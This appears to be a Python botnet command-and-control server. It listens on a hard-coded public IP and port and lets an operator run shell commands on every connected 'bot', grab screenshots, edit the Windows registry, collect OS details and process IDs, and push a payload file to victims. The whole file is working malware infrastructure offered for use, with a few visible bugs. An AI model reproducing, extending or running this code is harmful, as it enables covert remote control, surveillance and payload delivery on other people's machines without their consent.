import socket
import struct
from threading import Thread
from time import sleep
import sys
import os

if(len(sys.argv) > 1):
    payload_name = str(sys.argv[1])

botnet = {} #Botnet dictionary
exec_command = "null"
on_connect_exit = False
test_bool = False

#def check_bot(addr):
#    global botnet_address
#    for add in botnet_address:
#        if(add == addr):
#            return True
#    return False

def start_server(port=2003,ip="142.93.197.240"):
    global botnet,exec_command,on_connect_exit
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((ip,port))
    s.listen(5)
    print("\n[*] Server Started!\n")
    while True:
        try:
            bot,addr = s.accept()
            if(botnet.get(str(addr[0]))):
                continue
            print("[*] New bot %s"%(str(addr[0])))
            botnet[str(addr[0])] = bot
            print(">>")
        except socket.error:
            pass

def test_conn(bot,addr):    #Arg 1 --> bot_socket, 2 --> bot_address
    try:
        bot.send("CHECK".encode())
        resp = bot.recv(1024).decode()
        if(resp == "YES"):
            print("[*] %s : Active"%(addr))
            global test_bool
            test_bool = True
    except socket.error:
        test_bool = False
        pass

def test_bots():
    global botnet
    for bot in botnet:
        bot_test_thread = Thread(target=test_conn,args=(botnet[bot],bot))
        bot_test_thread.start()
        sleep(5)
        global test_bool
        if(test_bool == False):
            print("[*] %s : Dead"%(bot))

def detect_os():
    global botnet
    #Build a dictionary of botnet addresses and sock connections
    for bot in botnet:
        botnet[bot].send("OS".encode())
        bot_os = botnet[bot].recv(1024).decode()
        print("\nDetails for %s : "%(str(bot)))
        print(bot_os)
        print("\n\n\n\n")

def make_output_file(name,data):
    file = open(name+'.txt','w')
    file.write(data)
    file.close()
    print("[*] Output stored in %s"%(name+'.txt'))
    return

def shell_exec(cmd):
    global botnet
    for bot in botnet:
        botnet[bot].send(cmd.encode())
        resp = botnet[bot].recv(1024).decode()
        sleep(1)
        if(resp == "DONE"):
            shell_resp = botnet[bot].recv(1024).decode()
            print("[*] Shell execution successful on %s"%(bot))
            check_container(bot)
            make_output_file("shell_output",str(shell_resp))
        elif(resp == "FAILED"):
            print("[*] Shell execution failed on %s"%(bot))

def update_botnet():
    while True:
        try:
            sleep(15)
            global botnet,test_bool
            for bot in botnet:
                test_conn(botnet[bot],bot)
                if(test_bool == False):
                    print("[*] %s : Connection dead"%(bot))
                    del botnet[bot]
                else:
                    pass
        except socket.error:
            print("[*] %s : Connection dead"%(bot))

def check_container(bot):
    if(os.path.exists(bot) != True):
        os.makedirs(bot)
    os.chdir(bot)

def get_screenshot(addr):
    global botnet
    botnet[addr].send("screenshot".encode())
    resp = botnet[addr].recv(1024)
    try:
        if(resp.decode() == "FAILED"):
            print("[*] Failed to get screenshot from %s"%(addr))
            return
        elif(resp.decode() == "OK"):
            pass
    except:
        pass
    size = botnet[addr].recv(1024).decode()
    image = botnet[addr].recv(int(size))
    check_container(addr)
    #os.chdir(addr)
    extension = ".png"
    file = open("scrnshot"+extension,'wb')
    file.write(image)
    file.close()

def exec_command(cmd):
    global botnet
    print("[*] Sending Command Packets...")
    sleep(1)
    for bot in botnet:
        botnet[bot].send(cmd.encode())
        resp = botnet[bot].recv(1024).decode()
        if(resp == "SUCCESS"):
            print("[*] Command executed on %s"%(bot))
        elif(resp == "FAILED"):
            print("[*] Command execution failed on %s"%(bot))
        #cmd_size = len(cmd)
        #packet = struct.pack("<H%ds"%(cmd_size),cmd_size,cmd) # H --> 2 Bytes Buffer Size
        #bot.send(packet)
        #print("[*] Command packet sent")

def edit_registry():
    global botnet
    for bot in botnet:
        botnet[bot].send("REGISTRY".encode())
        sleep(1)
        resp = botnet[bot].recv(1024).decode()
        if(resp == "OK"):
            sleep(1)
            pass
        elif(resp == "FAILED"):
            print("[*] Failed to edit registry on %s"%(bot))

def reboot_botnet():
    global botnet,payload_name
    for bot in botnet:
        try:
            print("[*] Rebooting : %s"%(bot))
            botnet[bot].send("restart".encode())
            file = open(payload_name,'rb')
            data = file.read()
            botnet[bot].send(data)
            file.close()
            print("[*] Payload sent to : %s"%(bot))
            resp = botnet[bot].recv(1024).decode()
            if(resp == "DONE"):
                print("[*] Bot %s rebooted"%(bot))
        except socket.error:
            print("[*] %s : Dead"%(bot))
        except:
            print("[*] Failed to reboot %s"%(bot))

def get_pid():
    global botnet
    for bot in botnet:
        try:
            botnet[bot].send("pid".encode())
            pid = botnet[bot].recv(1024).decode()
            print("%s PID : %s"%(bot,pid))
        except socket.error:
            print("[*] %s : Dead"%(bot))
        except:
            print("[*] Failed to get PID from %s"%(bot))

def process_cmd(cmd):
        global botnet
        sleep(1)

        try:
            if "pid" in cmd:
                get_pid()

            if "restart" in cmd:
                reboot_botnet()

            if "updater" in cmd:
                updater_thread = Thread(target=update_botnet,args=())
                updater_thread.start()

            if(cmd == "show botnet"):
                count = 1
                for bot in botnet:
                    print("[*] %d : %s"%(count,str(bot)))
                    count += 1

            if "screenshot" in cmd:
                addr = cmd.strip("screenshot ")
                get_screenshot(addr)

            if 'execute' in cmd:
                #cmd = cmd.strip("execute ")
                exec_command(cmd)
                print("[*] Command packets sent!")

            if(cmd == "get os"):
                detect_os()

            if "shell" in cmd:
                shell_exec(cmd)

            if "registry" in cmd:
                edit_registry()

            if 'test' in cmd:
                cmd = cmd.strip("test ")
                t1 = Thread(target=test_bots,args=())
                t1.start()
                pass
            else:
                print("[*] Invalid command")
        except socket.error:
            print("[*] Socket error")
        except:
            print("[*] Error occurred while processing command")

def main():
    try:
        listener_thread = Thread(target=start_server,args=())
        listener_thread.start()
        sleep(2)
        while True:
            cmd = raw_input("\n>>")
            command_thread = Thread(target=process_cmd,args=(cmd,))
            command_thread.start()
            command_thread.join()
    except KeyboardInterrupt:
        print("[*] Botnet Terminated!")
        #listener_thread.kill()
        quit()
    except:
        print("[*] Unknown Error Occured ...")

if __name__ == '__main__':
    main()
